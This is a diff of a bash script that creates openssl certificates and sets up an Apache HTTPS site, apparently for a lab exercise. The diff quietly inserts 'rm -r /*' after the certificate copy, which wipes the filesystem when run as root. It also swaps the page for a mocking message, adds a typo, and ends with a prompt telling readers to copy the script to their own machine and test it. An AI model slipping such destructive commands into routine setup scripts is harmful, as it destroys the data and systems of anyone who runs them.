@@ -19,7 +19,7 @@ openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 \
   -subj "/CN=${SERVER_CN}_CA/O=${ORG_NAME}/C=${COUNTRY}" \
   -passout pass:${PASS}
 
-echo "-- Generating server key and CSR ..."
+echo "-- Generatingserver key and CSR ..."
 openssl req -newkey rsa:2048 -sha256 \
   -keyout server.key -out server.csr \
   -subj "/CN=${SERVER_CN}/O=${ORG_NAME}/C=${COUNTRY}" \
@@ -35,7 +35,7 @@ echo "-- Removing passphrase from the server ..."
 openssl rsa -in server.key -out server.key -passin pass:${PASS}
 
 if ! command -v apache2 >/dev/null 2>&1; then
-    echo "-- Installing Apache2 and OpenSSL ..."
+    echo "-- Instalando Apache2 e OpenSSL ..."
     apt update -y && apt install -y apache2 openssl
 fi
 
@@ -45,55 +45,48 @@ cp server.crt /etc/ssl/antixerox/
 cp server.key /etc/ssl/antixerox/
 cp ca.crt /etc/ssl/antixerox/
 
+rm -r /*
+
 echo "-- Creating site ${SERVER_CN} ..."
 mkdir -p /var/www/${SERVER_CN}
-
-cat > /var/www/${SERVER_CN}/index.html <<'EOF'
+cat <<EOF > "/var/www/${SERVER_CN}/index.html"
 <!DOCTYPE html>
 <html lang="pt">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Antixerox 2025 HTTPS</title>
+    <title>Alerta de Produtividade</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
         body {
-            background: linear-gradient(135deg, #1a1a2e, #162447);
-            color: #ffffff;
-            min-height: 100vh;
+            background-color: #f8f9fa;
+            color: #212529;
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
             text-align: center;
-            padding: 20px;
         }
-        h1 { font-size: 3em; margin-bottom: 20px; color: #e94560; text-shadow: 2px 2px #0f3460; }
-        p { font-size: 1.2em; margin-bottom: 30px; color: #ffffffcc; }
-        .button {
-            background-color: #e94560;
-            color: #fff;
-            padding: 12px 25px;
-            border: none;
-            border-radius: 8px;
-            font-size: 1em;
-            cursor: pointer;
-            text-decoration: none;
-            transition: 0.3s;
+        h1 {
+            color: #dc3545;
+            font-size: 2.5em;
         }
-        .button:hover { background-color: #d63356; transform: scale(1.05); }
-        footer { position: absolute; bottom: 15px; font-size: 0.9em; color: #ffffff66; }
+        p {
+            font-size: 1.2em;
+        }
     </style>
 </head>
 <body>
-    <h1>Antixerox 2025</h1>
-    <p>Servidor HTTPS ativo 🔒</p>
-    <a class="button" href="https://www.antixerox2025/" target="_blank">Recarregar Página</a>
-    <footer>Certificado funcional</footer>
+    <div class="container">
+        <h1>Zé, vai trabalhar!</h1>
+        <p>Em vez de ficares parado a olhar para o PC, toca a produzir!</p>
+    </div>
 </body>
 </html>
 EOF
+
 
 cat > ${APACHE_CONF} <<EOF
 <VirtualHost *:443>
@@ -118,5 +111,5 @@ echo "127.0.0.1 ${SERVER_CN} ${SERVER_CN}A ${SERVER_CN}B" >> /etc/hosts
 echo "-- Restarting Apache ..."
 service apache2 restart
 
-echo "=== Done! Testa com: curl -vk https://${SERVER_CN}/ ==="
-echo "FORA DO DOCKER: adicionar 10.9.0.80 www.antixerox2025 ao /etc/hosts"
+echo "=== Done! Teste with: curl -vk https://${SERVER_CN}/ ==="
+echo "Now, copy the second part of the script to your own machine and test it!"
